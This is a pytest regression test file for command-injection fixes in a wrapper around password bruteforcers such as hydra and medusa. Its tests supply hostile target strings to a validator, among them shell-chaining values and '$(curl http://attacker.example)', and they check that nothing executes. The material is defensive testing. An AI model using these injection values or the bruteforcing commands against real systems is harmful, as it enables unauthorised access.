"""Regression tests for the command injection in ketepeto.py.

Original defects:

  * ketepeto.py:78  subprocess.call(f"type {command}", shell=True, ...)
  * ketepeto.py:166 os.system(f"hydra ... sftp://{target}")
    ketepeto.py:168 os.system(f"medusa -h {target} ...")
    ketepeto.py:170 os.system(f"ncrack ... {target}")
    ketepeto.py:172 os.system(f"patator sftp_login host={target} ...")
    ketepeto.py:174 os.system(f"john ... {target}")
  * ketepeto.py:89-117 ten unattended `sudo apt-get install -y` / `brew install`
    calls as a side effect of running the tool.

The os.system call was the worst of the set: it hands the string to /bin/sh,
so a target of `example.com; touch /tmp/pwned` runs an extra command as the
operator. Tests below assert that a hostile target cannot execute and that no
automatic privileged install happens without an explicit opt-in.

Nothing here contacts a network target or launches a real bruteforcer; the
execution tests use a sentinel file inside a pytest tmp_path and a stub
tool on PATH.
"""

import ast
import os
import platform
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import ketepeto  # noqa: E402


def _payload_for(sentinel):
    """A --target value that would run a second command under /bin/sh."""
    return f"example.com; python -c \"import pathlib; pathlib.Path(r'{sentinel}').write_text('pwned')\""


# --------------------------------------------------------------------------
# Target validation
# --------------------------------------------------------------------------

@pytest.mark.parametrize(
    "hostile",
    [
        "example.com; whoami",
        "example.com & whoami",
        "example.com && whoami",
        "example.com | whoami",
        "example.com`whoami`",
        "example.com$(whoami)",
        "example.com whoami",
        "example.com\nwhoami",
        "$(curl http://attacker.example)",
        "",
        "   ",
        None,
        "https://example.com",
        "user@example.com",
    ],
)
def test_validate_target_rejects_anything_that_is_not_a_host(hostile):
    with pytest.raises(ValueError):
        ketepeto.validate_target(hostile)


@pytest.mark.parametrize(
    "good", ["example.com", "10.0.0.5", "192.168.1.1", "localhost", "[::1]", "target.example.co.uk"]
)
def test_validate_target_accepts_hosts_and_ips(good):
    assert ketepeto.validate_target(good) == good


# --------------------------------------------------------------------------
# argv construction
# --------------------------------------------------------------------------

@pytest.mark.parametrize("tool", ["hydra", "medusa", "ncrack", "patator", "john"])
def test_build_command_is_list_form_for_every_tool(tool):
    argv = ketepeto.build_bruteforce_command(tool, "example.com", "/tmp/u.txt", "/tmp/p.txt")

    assert isinstance(argv, list)
    assert all(isinstance(part, str) for part in argv)
    assert argv[0] == tool, "argv[0] must be the tool itself, not a shell string"

    joined = " ".join(argv)
    for char in (";", "|", "&", "`", "$", "\n"):
        assert char not in joined


@pytest.mark.parametrize("tool", ["hydra", "medusa", "ncrack", "patator", "john"])
def test_build_command_rejects_injected_target(tool, tmp_path):
    sentinel = tmp_path / "pwned.txt"
    hostile = _payload_for(sentinel)

    with pytest.raises(ValueError):
        ketepeto.build_bruteforce_command(tool, hostile, "/tmp/u.txt", "/tmp/p.txt")

    assert not sentinel.exists()


def test_hydra_target_is_a_single_argv_element():
    argv = ketepeto.build_bruteforce_command("hydra", "example.com", "/tmp/u.txt", "/tmp/p.txt")

    assert "sftp://example.com" in argv
    assert argv[-1] == "sftp://example.com"


def test_unknown_bruteforcer_is_rejected():
    with pytest.raises(ValueError):
        ketepeto.build_bruteforce_command("rm", "example.com", "/tmp/u.txt", "/tmp/p.txt")


# --------------------------------------------------------------------------
# End-to-end: the injection must not execute
# --------------------------------------------------------------------------

def _stub_tool_on_path(tmp_path, monkeypatch):
    """Put a fake `hydra` on PATH so run_bruteforce_command can be invoked."""
    bindir = tmp_path / "bin"
    bindir.mkdir()
    stub = bindir / "hydra"
    stub.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    stub.chmod(0o755)
    monkeypatch.setenv("PATH", str(bindir), prepend=os.pathsep)
    return bindir


@pytest.mark.skipif(platform.system() == "Windows", reason="relies on POSIX sh argv handling")
def test_injected_target_does_not_execute_end_to_end(tmp_path, monkeypatch):
    """Build and run the command the way main() does; nothing must execute."""
    sentinel = tmp_path / "pwned.txt"
    hostile = _payload_for(sentinel)
    _stub_tool_on_path(tmp_path, monkeypatch)

    with pytest.raises(ValueError):
        argv = ketepeto.build_bruteforce_command("hydra", hostile, "/tmp/u.txt", "/tmp/p.txt")
        subprocess.run(argv, shell=False, check=False)

    assert not sentinel.exists(), "the injected target executed"


# --------------------------------------------------------------------------
# Privileged installs must be opt-in
# --------------------------------------------------------------------------

def test_no_install_without_opt_in(monkeypatch, tmp_path):
    """install_dependencies() must not launch a package manager by default."""
    calls = []

    def fake_run(argv, *args, **kwargs):
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(ketepeto.subprocess, "run", fake_run)
    monkeypatch.setattr(ketepeto, "command_exists", lambda tool: False)
    monkeypatch.setattr(ketepeto.platform, "system", lambda: "Linux")

    ketepeto.install_dependencies(allow_install=False)

    assert calls == [], f"a package manager was launched without consent: {calls}"


def test_install_requires_explicit_opt_in(monkeypatch):
    calls = []

    def fake_run(argv, *args, **kwargs):
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(ketepeto.subprocess, "run", fake_run)
    monkeypatch.setattr(ketepeto, "command_exists", lambda tool: False)
    monkeypatch.setattr(ketepeto.platform, "system", lambda: "Linux")

    ketepeto.install_dependencies(allow_install=True)

    assert len(calls) == len(ketepeto.REQUIRED_TOOLS)
    for argv in calls:
        assert isinstance(argv, list)
        assert argv[0] == "sudo"
        assert argv[1:4] == ["apt-get", "install", "-y"]


def test_no_shell_or_os_system_anywhere_in_module():
    """AST-level proof that no code path asks for a shell.

    Uses ast rather than string matching so that prose in docstrings (which
    documents the historical `shell=True` calls) cannot mask or fake a result.
    """
    tree = ast.parse(Path(ketepeto.__file__).read_text(encoding="utf-8"))

    shell_true = []
    os_system = []

    for node in ast.walk(tree):
        # subprocess.*(..., shell=True)
        if isinstance(node, ast.Call):
            for keyword in node.keywords:
                if keyword.arg == "shell" and isinstance(keyword.value, ast.Constant):
                    if keyword.value.value is True:
                        shell_true.append(getattr(node, "lineno", "?"))

            func = node.func
            if isinstance(func, ast.Attribute) and func.attr == "system":
                if isinstance(func.value, ast.Name) and func.value.id == "os":
                    os_system.append(node.lineno)

    assert shell_true == [], f"shell=True still present at line(s) {shell_true}"
    assert os_system == [], f"os.system still present at line(s) {os_system}"


def test_every_subprocess_call_uses_a_list_argv():
    """Every subprocess call must pass a list, never a formatted string."""
    tree = ast.parse(Path(ketepeto.__file__).read_text(encoding="utf-8"))

    string_argv_calls = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if not (isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)):
            continue
        if func.value.id != "subprocess":
            continue
        # First positional arg is the command.
        if node.args:
            first = node.args[0]
            # A JoinedStr (f-string) or BinOp-built string is the dangerous form.
            if isinstance(first, (ast.JoinedStr, ast.BinOp)):
                string_argv_calls.append(node.lineno)

    assert string_argv_calls == [], (
        f"subprocess called with an interpolated string argv at line(s) {string_argv_calls}"
    )